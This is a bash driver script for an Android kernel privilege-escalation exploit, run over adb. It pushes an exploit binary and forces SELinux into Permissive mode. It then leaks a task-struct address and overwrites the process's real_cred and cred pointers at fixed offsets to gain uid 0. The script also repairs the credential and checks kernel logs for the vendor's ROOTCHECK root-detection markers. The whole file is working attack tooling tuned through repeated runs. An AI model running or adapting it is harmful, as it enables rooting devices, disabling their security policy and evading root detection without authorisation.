#!/bin/bash
# run_bootA.sh — ONE boot, ONE shot per offset.
#
#   "does a PI write whose write_value is a sprayed HEAP pointer, rather than the
#    init_cred image, reboot the machine?"
#
# Design rules (2026-09-18):
#   * ONE shot per offset (ROUNDS=1).  No SIGKILL — a writer whose three-thread
#     futex protocol may still be live must be allowed to exit on its own, and
#     V12_PIN_FORK=1 keeps the payload page alive after it does.
#   * The judge is the target's own readback: /proc/<pid>/status Uid for
#     real_cred (task+0x778), the child's own getuid() for cred (task+0x780).
#     `probe_state` is NOT consulted (W1 landed while reporting R).
#   * The kernel log is captured to the HOST and deduped by KERNEL TIMESTAMP,
#     not by a line counter.  A counter is wrong here: the ring buffer is full
#     and churning, so `dmesg | wc -l` oscillates down by a line or two, and a
#     "count went down -> reset" rule re-appends the whole buffer.  Run 7 did
#     exactly that: 799 212 lines for 24 853 unique, ~73 MB, and it saturated
#     adb so badly that each shot took 80-95 s instead of ~15 s.
#   * The poller is PAUSED while a shot is in flight — adb is the contended
#     resource, and the shot is what we are timing.
#
# Overridable: ADB= SER= BIN_LOCAL= OUT= HOLD= CHAINWAIT= NODRAIN= ROUNDS= CONTROL=1
#   NODRAIN=1 (default) skips slab_drain() — 5 waves x 400 forked children, each
#     pause()d then SIGKILLed, at the start of every W7 invocation.  This is the
#     single heaviest difference between the boots that rebooted and run 7 which
#     did not, so NODRAIN=0 is the control to try next.
#   ROUNDS=n allows up to n shots at the same offset (no kill between them, stop
#     as soon as the readback moves).  Default 1.
#   CONTROL=1 fires the 0x778 shot with V12_ALLOW_INIT_CRED=1 (write_value = the
#     init_cred image).  It REPLACES the normal shot; run it as its own boot, and
#     only after a boot in which a sprayed-page write LANDED and did not reboot.
set -u
export MSYS_NO_PATHCONV=1 MSYS2_ARG_CONV_EXCL="*"

ADB=${ADB:-adb}
SER=${SER:-$( "$ADB" devices 2>/dev/null | sed -n "2s/[[:space:]].*//p" )}
DEV=/data/local/tmp
# Run-unique device-side paths: after one of these events /data/local/tmp files
# can become root-owned and un-statable for shell, so a fixed name poisons every
# later run (adb push then fails with "stat failed ... Permission denied").
TAG=${TAG:-$(date +%m%d_%H%M%S)}
BIN=$DEV/glxA_$TAG
BINW=$DEV/glxW_$TAG
EV=$DEV/bootA_ev_$TAG.txt
TASKF=$DEV/bootA_task_$TAG.txt
RES=$DEV/bootA_res_$TAG.txt
OUT=${OUT:-./bootA_$(date +%m%d_%H%M%S)}
HOLD=${HOLD:-20}
# CHAINWAIT: the proven value is 6000 ms (tools/t5loop.sh CW=6000).  The code
# default is 20000 ms.  4000 was tried for speed and is BELOW anything that has
# ever landed — the chain simply has not finished, which shows up as
# probe_state=R and an unchanged readback.
CHAINWAIT=${CHAINWAIT:-6000}
NODRAIN=${NODRAIN:-1}
ROUNDS=${ROUNDS:-1}
CONTROL=${CONTROL:-0}
KLOG=$OUT/klog.host
POLLPID=""
mkdir -p "$OUT"

A() { "$ADB" -s "$SER" shell "$@"; }
say() { echo "[$(date +%H:%M:%S)] $*"; }
detach() { timeout 15 "$ADB" -s "$SER" shell "$1" >/dev/null 2>&1 || true; }
uid_line() { A "grep -m1 '^Uid:' /proc/$1/status 2>/dev/null" | tr -d '\r' | tr -s ' \t' ' '; }
alive() { [ -n "$(A 'cut -d. -f1 /proc/uptime' | tr -d '\r')" ]; }
svc_count() {
    local n=0 s
    for s in package power input phone wifi; do
        case "$(A "service check $s" 2>/dev/null | tr -d '\r')" in *found*) n=$((n+1));; esac
    done
    echo "$n"
}

# ---- kernel log: host-side poll, deduped by kernel timestamp ----------------
start_klog() {
    [ -n "$POLLPID" ] && return 0
    ( while :; do
          last=$(tail -1 "$KLOG" 2>/dev/null | sed -n 's/^\[ *\([0-9][0-9.]*\)\].*/\1/p')
          [ -z "$last" ] && last=0
          t3=$( "$ADB" -s "$SER" shell "dmesg | tail -n 2000" 2>/dev/null | tr -d '\r' )
          [ -z "$t3" ] && { sleep 5; continue; }
          mt=$(printf '%s\n' "$t3" | tail -1 | sed -n 's/^\[ *\([0-9][0-9.]*\)\].*/\1/p')
          [ -z "$mt" ] && mt=0
          # timestamps went BACKWARDS -> the box rebooted; start a fresh capture
          if awk -v a="$mt" -v b="$last" 'BEGIN{exit !(a+0 < b+0)}'; then
              printf '\n### [poll] kernel timestamps went backwards (%s < %s) - reboot seen at %s\n\n' \
                     "$mt" "$last" "$(date +%H:%M:%S)" >> "$KLOG"
              last=0
          fi
          printf '%s\n' "$t3" | awk -v t="$last" '
              {
                  if ($0 ~ /^\[ *[0-9]+\.[0-9]+\]/) {
                      ts=$0; sub(/^\[ */,"",ts); sub(/\].*/,"",ts); ts=ts+0
                      keep = (ts > t) ? 1 : 0
                  }
                  if (keep) print
              }' >> "$KLOG"
          sleep 5
      done ) &
    POLLPID=$!
}
stop_klog() { [ -n "$POLLPID" ] && kill "$POLLPID" 2>/dev/null; POLLPID=""; }

# ---------------------------------------------------------------- preflight
say "=== preflight ==="
"$ADB" devices | grep -q "$SER" || { echo "device $SER not attached"; exit 1; }
A 'uname -r; getenforce; cat /proc/sys/kernel/random/boot_id; uptime; cat /proc/loadavg' \
    | tee "$OUT/00_preflight.txt" | tr -d '\r'
"$ADB" push "${BIN_LOCAL:-./exploit_guard}" "$BIN"  2>&1 | tail -1
"$ADB" push "${BIN_LOCAL:-./exploit_guard}" "$BINW" 2>&1 | tail -1
A "chmod 755 $BIN $BINW"

# ---------------------------------------------------------------- 1. Permissive
say "=== step 1: SELinux Permissive ==="
if [ "$(A 'getenforce' | tr -d '\r')" = "Permissive" ]; then
    say "  already Permissive — skipping W1 entirely"
else
    W1OK=0
    for r in 1 2 3 4 5 6 7 8; do
        A "cd $DEV && V12B_EVIDENCE=$DEV/bootA_w1_ev_$TAG.txt timeout 190 ./$(basename "$BIN") W1 >/dev/null 2>&1"
        EN=$(A 'getenforce' | tr -d '\r')
        say "  W1 round $r: $EN"
        [ "$EN" = "Permissive" ] && { W1OK=1; break; }
        sleep 2
    done
    [ "$W1OK" = 1 ] || { say "!! not Permissive — stopping"; exit 2; }
fi

# ---------------------------------------------------------------- 2. klog
say "=== step 2: host-side kernel log (dmesg poll, deduped by timestamp) ==="
if "$ADB" -s "$SER" shell 'head -c1 /dev/kmsg' >/dev/null 2>&1; then
    say "  /dev/kmsg readable — streaming it"
    ( "$ADB" -s "$SER" exec-out cat /dev/kmsg >> "$KLOG" 2>/dev/null ) &
    POLLPID=$!
else
    say "  /dev/kmsg NOT readable (expected here) — polling dmesg from the host"
    start_klog
fi
sleep 5
say "  klog lines after 5s: $(wc -l < "$KLOG")"

# ---------------------------------------------------------------- 3. settle
say "=== step 3: load settle (max 15s, threshold 16) ==="
for i in 1 2 3 4 5 6 7; do
    L=$(A 'cut -d" " -f1 /proc/loadavg' | tr -d '\r')
    say "  load1=$L"
    awk -v l="$L" 'BEGIN{exit !(l+0 < 16)}' && break
    sleep 2
done

# ---------------------------------------------------------------- 4. LT
say "=== step 4: LT child (pure userspace spin, NO_EXEC) ==="
TASK=""; CPID=""; PPID_LT=""
for attempt in $(seq 1 12); do
    detach "cd $DEV && setsid nohup env V12_TASK_FILE=$TASKF V12_RESULT_FILE=$RES V12B_EVIDENCE=$DEV/bootA_lt_ev_$TAG.txt V12_NO_EXEC=1 ./$(basename "$BIN") LT > $DEV/bootA_lt_$TAG.log 2>&1 </dev/null &"
    for i in $(seq 1 25); do
        sleep 1
        TASK=$(A "cat $TASKF 2>/dev/null" | tr -d '\r\n')
        [ -n "$TASK" ] && break
    done
    [ -n "$TASK" ] && break
    say "  LT attempt $attempt rejected: $(A "grep -m1 suspicious $DEV/bootA_lt_$TAG.log 2>/dev/null" | tr -d '\r')"
done
[ -z "$TASK" ] && { say "!! no task leak — stopping"; stop_klog; exit 3; }
LTLOG=$(A "cat $DEV/bootA_lt_$TAG.log 2>/dev/null")
CPID=$(printf '%s\n' "$LTLOG" | sed -n 's/.*LT child_task = 0x[0-9a-f]* pid=\([0-9]*\).*/\1/p' | head -1)
PPID_LT=$(printf '%s\n' "$LTLOG" | sed -n 's/.*LT parent pid=\([0-9]*\) child=.*/\1/p' | head -1)
say "  task=$TASK child_pid=$CPID lt_parent=$PPID_LT"
say "  baseline: $(uid_line "$CPID")"

# ---------------------------------------------------------------- 5. shots
poll_uid() {   # $1=pid $2=timeout_s -> the first Uid line that is no longer 2000
    local pid=$1 t=$2 i u=""
    for i in $(seq 1 "$t"); do
        u=$(uid_line "$pid")
        case "$u" in
            ""|*"2000 2000 2000 2000"*) sleep 1;;
            *) echo "$u"; return 0;;
        esac
    done
    echo "$u"
}

# one shot; echoes the write value it used.  The poller is PAUSED across it,
# because adb is the contended resource and the shot is what we are timing.
shot() {
    local off=$1 extra=$2 tag=$3
    local ev="$DEV/bootA_ev_${TAG}_$tag.txt"
    A "rm -f $ev 2>/dev/null; true"
    stop_klog
    say "  [$tag] ONE shot: off=$off chainwait=${CHAINWAIT}ms hold=${HOLD}s nodrain=$NODRAIN ${extra:-}"
    local t0 t1
    t0=$(date +%s)
    detach "cd $DEV && setsid nohup env V12_TASK_FILE=$TASKF V12_W7_OFF=$off V12_CRED_VALUE_OFF=0 V12_CHAIN_WAIT_MS=$CHAINWAIT V12_HOLD_SEC=$HOLD V12_PIN_FORK=1 V12_NODRAIN=$NODRAIN $extra V12B_EVIDENCE=$ev ./$(basename "$BINW") W7 > $DEV/w7_${TAG}_$tag.log 2>&1 </dev/null &"
    local i out=""
    for i in $(seq 1 20); do
        sleep 1
        out=$(A "cat $ev 2>/dev/null" | tr -d '\r')
        printf '%s' "$out" | grep -q 'probe_state' && break
    done
    sleep 1
    out=$(A "cat $ev 2>/dev/null" | tr -d '\r')
    printf '%s\n' "$out" > "$OUT/w7_$tag.txt"
    t1=$(date +%s)
    start_klog
    say "  [$tag] shot wall-clock: $((t1 - t0))s"
    grep -E 'write value|write_value|write_target|probe_state|probe_done|LOCAL repair|PIN child|HOLD|REFUSED' \
        "$OUT/w7_$tag.txt" | sed 's/^/    /'
    # ★ probe_state semantics for W7 (docs/28, and tools/t5loop.sh line 11):
    #     D = the write LANDED;  R = it did not;  S = blocked/[7] passed.
    #   The exploit's own printout only calls S a HIT, so for W7 it reports
    #   "miss" on the very runs that landed (see out/t5_w7_778.txt:
    #   `probe_state = D` + `Uid: 0 0 4294967176 0` + "*** 0x778 LANDED ***").
    #   Never trust its HIT/miss line here.
    SHOT_PS=$(sed -n 's/^probe_state *= *\([A-Z?]\).*/\1/p' "$OUT/w7_$tag.txt" | tail -1)
    SHOT_CRED=$(printf '%s\n' "$out" | sed -n 's/.*write value = private cred page \(0x[0-9a-f]*\).*/\1/p' | tail -1)
    say "  [$tag] probe_state=$SHOT_PS  (D=landed, R=miss, S=blocked)"
    return 0
}

# up to $4 shots at one offset; no kill; stop as soon as the readback moves
shot_until() {   # $1=off $2=extra $3=tag $4=rounds -> 0 if the readback moved
    local off=$1 extra=$2 tag=$3 rounds=${4:-1} r u
    for r in $(seq 1 "$rounds"); do
        shot "$off" "$extra" "${tag}r$r"
        if ! alive; then say "  !! DEVICE GONE after $tag round $r"; exit 5; fi
        if [ "${SHOT_PS:-}" = "D" ]; then
            say "  [$tag] probe_state=D on round $r — the write landed"
            return 0
        fi
        u=$(poll_uid "$CPID" 8)
        case "$u" in
            ""|*"2000 2000 2000 2000"*)
                say "  [$tag] round $r/$rounds: readback unchanged";;
            *)  say "  [$tag] readback moved on round $r: [$u]"; return 0;;
        esac
        [ "$r" -lt "$rounds" ] && sleep 2
    done
    return 1
}

say "=== step 5: 0x778 shot(s) (real_cred) ==="
if [ "$CONTROL" = "1" ]; then
    say "  ⚠ CONTROL: V12_ALLOW_INIT_CRED=1 — write_value = the init_cred image"
    shot_until 0x778 "V12_ALLOW_INIT_CRED=1 V12_W7_INIT_CRED=1" w778ctl "$ROUNDS" || true
else
    shot_until 0x778 "" w778 "$ROUNDS" || true
fi
U778=$(uid_line "$CPID")
say "  after 0x778: [$U778]   (recorded as data; the gate is 0x780 + repair)"

say "=== step 6: 0x780 shot(s) (cred) ==="
CRED=""
if shot_until 0x780 "" w780 "$ROUNDS"; then
    say "  after 0x780: [$(uid_line "$CPID")]"
    CRED=$(grep -h -m1 'write value = private cred page' "$OUT"/w7_w780*.txt 2>/dev/null \
           | sed -n 's/.*page \(0x[0-9a-f]*\).*/\1/p' | tail -1)
else
    say "  ✗ 0x780 did not move the readback — SKIPPING the repair."
    say "    The repair only exists to clear cred+8 of the cred that was actually"
    say "    installed; with nothing installed it repairs a page nobody points at."
    say "    (Run 7 burned 86 s on exactly that.)"
fi

if [ -n "$CRED" ]; then
    say "=== step 7: ONE local repair of cred+8 (cred=0x$CRED) ==="
    shot 0x780 "V12_W7_ZERO=1 V12_W7_REPAIR_CRED=1 V12_W7_REPAIR_ADDR=$CRED" repair >/dev/null
    alive || { say "  !! DEVICE GONE after the repair shot"; exit 5; }
    say "  after repair: [$(uid_line "$CPID")]"
fi

say "=== verdict ==="
UREP=$(uid_line "$CPID")
RPT=$(A "cat $RES 2>/dev/null | tail -1" | tr -d '\r')
say "  /proc/$CPID/status Uid: [$UREP]"
say "  child's own report:     [$RPT]"
case "$UREP$RPT" in
  *"0 0 0 0"*|*"uid=0"*|*noexec*) say "  ★ CRED TOOK — this boot answered the Boot A question.";;
  *) say "  ✗ cred did not take in this boot.  Take a fresh boot; do not add rounds.";;
esac

say "=== step 8: poke LT parent ==="
[ -n "$PPID_LT" ] && A "kill -USR1 $PPID_LT" 2>&1 | tr -d '\r'
for i in $(seq 1 15); do
    sleep 1
    R=$(A "cat $RES 2>/dev/null" | tr -d '\r' | tail -1)
    [ -n "$R" ] && { say "  child report: $R"; break; }
done

say "=== step 9: watch 15s ==="
for i in 5 10 15; do
    sleep 5
    UP=$(A 'cut -d. -f1 /proc/uptime' | tr -d '\r')
    [ -z "$UP" ] && { say "  !! device gone at t+${i}s — REBOOT"; break; }
    say "  t+${i}s up=$UP services=$(svc_count)/5"
done

say "=== step 10: evidence ==="
stop_klog
say "  klog.host: $(wc -l < "$KLOG") lines, $(sort -u "$KLOG" 2>/dev/null | wc -l) unique"
say "  --- reboot / watchdog markers (NOT ROOTCHECK) ---"
if grep -anE 'sys_reboot|reboot: |Restarting system|hung_task|softlockup|soft lockup|Unable to handle|Call trace|BUG:|timestamps went backwards' \
        "$KLOG" | tail -30 > "$OUT/10_reboot_markers.txt"; then
    sed 's/^/    /' "$OUT/10_reboot_markers.txt"
else
    say "    (none)"
fi
say "  --- guard markers ---"
grep -aE 'ROOTCHECK|oplus_root|sys_call_number|path@@|execve_' "$KLOG" | tail -20 > "$OUT/10_rootcheck.txt"
if [ -s "$OUT/10_rootcheck.txt" ]; then sed 's/^/    /' "$OUT/10_rootcheck.txt"; else say "    (none)"; fi
A "getprop ro.boot.bootreason; getenforce; uptime; grep -c '^kernelsu' /proc/modules 2>/dev/null" | tee "$OUT/10_final.txt"
for f in bootA_lt_$TAG.log bootA_lt_ev_$TAG.txt; do
    A "cat $DEV/$f 2>/dev/null" | tr -d '\r' > "$OUT/$f"
done
say "evidence -> $OUT"
say "=== done ==="
